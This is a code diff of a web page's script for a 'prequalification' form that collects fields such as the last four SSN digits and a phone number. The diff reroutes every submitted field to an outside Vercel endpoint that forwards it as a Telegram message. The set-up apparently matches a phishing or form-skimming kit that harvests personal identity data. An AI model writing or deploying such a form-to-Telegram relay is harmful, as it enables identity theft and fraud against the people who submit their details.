@@ -332,44 +332,48 @@
 
 <script>
 document.getElementById('prequalForm').addEventListener('submit', async function(e) {
-    e.preventDefault();
+  e.preventDefault();
 
-    const form = this;
-    const formData = new FormData(form);
-    const data = Object.fromEntries(formData.entries());
+  const form = this;
+  const formData = new FormData(form);
+  const entries = Array.from(formData.entries())
+      .map(([key, value]) => `${key}: ${value}`)
+      .join('\n');
 
-    try {
-        const response = await fetch("/api/sendToTelegram", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data),
-        });
+  const message = `📩 *New Form Submission*\n\n${entries}`;
 
-        if (response.ok) {
-            form.style.display = "none";
-            document.getElementById("successMessage").classList.remove("hidden");
-        } else {
-            alert("⚠️ Failed to send form. Please try again.");
-        }
-    } catch (error) {
-        console.error("Telegram send error:", error);
-        alert("❌ Something went wrong. Please try again later.");
+  try {
+    const response = await fetch("https://archive-freedomplus-wz9m.vercel.app/api/sendToTelegram", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ text: message })
+    });
+
+    if (response.ok) {
+      form.style.display = "none";
+      document.getElementById("successMessage").classList.remove("hidden");
+    } else {
+      alert("⚠️ Failed to send form. Try again.");
     }
+  } catch (error) {
+    console.error("Telegram send error:", error);
+    alert("❌ Something went wrong. Please try again later.");
+  }
 });
 
-// Formatters (keep these)
-document.getElementById('ssnLast4')?.addEventListener('input', function() {
-    this.value = this.value.replace(/[^0-9]/g, '');
+// Keep your existing formatters
+document.getElementById('ssnLast4')?.addEventListener('input', function(e) {
+  this.value = this.value.replace(/[^0-9]/g, '');
 });
 
-document.getElementById('phone')?.addEventListener('input', function() {
-    let value = this.value.replace(/[^0-9]/g, '');
-    if (value.length >= 6) {
-        value = value.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
-    } else if (value.length >= 3) {
-        value = value.replace(/(\d{3})(\d{3})/, '($1) $2');
-    }
-    this.value = value;
+document.getElementById('phone')?.addEventListener('input', function(e) {
+  let value = this.value.replace(/[^0-9]/g, '');
+  if (value.length >= 6) {
+    value = value.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
+  } else if (value.length >= 3) {
+    value = value.replace(/(\d{3})(\d{3})/, '($1) $2');
+  }
+  this.value = value;
 });
 </script>
 <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'993ce26945fdef49',t:'MTc2MTM0NDY2Ny4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
